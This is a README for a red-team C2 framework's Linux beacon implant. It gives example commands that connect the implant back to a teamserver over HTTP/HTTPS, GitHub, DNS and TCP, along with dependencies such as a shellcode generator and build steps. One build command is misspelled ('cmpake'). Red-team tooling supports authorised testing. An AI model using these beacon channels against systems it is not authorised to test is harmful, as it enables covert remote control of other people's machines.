# Exploration C2 Linux Implant

## Overview

**Exploration** is a modular Command and Control (C2) framework designed for red team operations. This repository provides the **Beacon** component implemented in C++ for targeting Linux systems. The associated TeamServer and Client components are available in the [C2TeamServer](https://github.com/maxDcb/C2TeamServer) repository.

Multiple Beacons in this project are capable of communicating with the TeamServer over various channels. Supported transport mechanisms include HTTP/HTTPS, GitHub, DNS, and TCP.

## Communication Examples

```bash
# HTTP/HTTPS
BeaconHttp <TEAMSERVER_IP> <LISTENER_PORT> <http|https>
BeaconHttp 10.10.10.10 8443 https
BeaconHttp 10.10.10.10 8080 http

# GitHub
BeaconGithub <GITHUB_USER/REPO> <ACCESS_TOKEN>
BeaconGithub maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...

# DNS
BeaconDns <DNS_SERVER> <TEAMSERVER_DOMAIN>
BeaconDns 8.8.8.8 bac.superdomain.com

# TCP
BeaconTcp <LISTENER_IP> <LISTENER_PORT>
BeaconTcp 127.0.0.1 4444
```

## Build Instructions

### Submodules & External Dependencies

This project utilizes several external libraries and tools:

* [Donut](https://github.com/TheWover/donut): Generates shellcode from PE files.
* [COFFLoader](https://github.com/trustedsec/COFFLoader): Executes object files, such as those in [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): Provides base64 encoding/decoding.
* [nlohmann/json](https://github.com/nlohmann/json): JSON parsing library.

### Building the Linux Beacons and Modules

Initialize submodules and prepare the build environment:

```bash
git submodule update --init
mkdir build
cd build
```

Compile with or without tests and logging:

```bash
# With tests and logs
cmpake .. -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=./conan_provider.cmake -DWITH_TESTS=ON

# Without tests and logs
cmake .. -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=./conan_provider.cmake -DWITH_TESTS=OFF

make -j4
```

### Output Locations

* Compiled Beacons: `Release/Beacons`
* Compiled Modules: `Release/Modules`
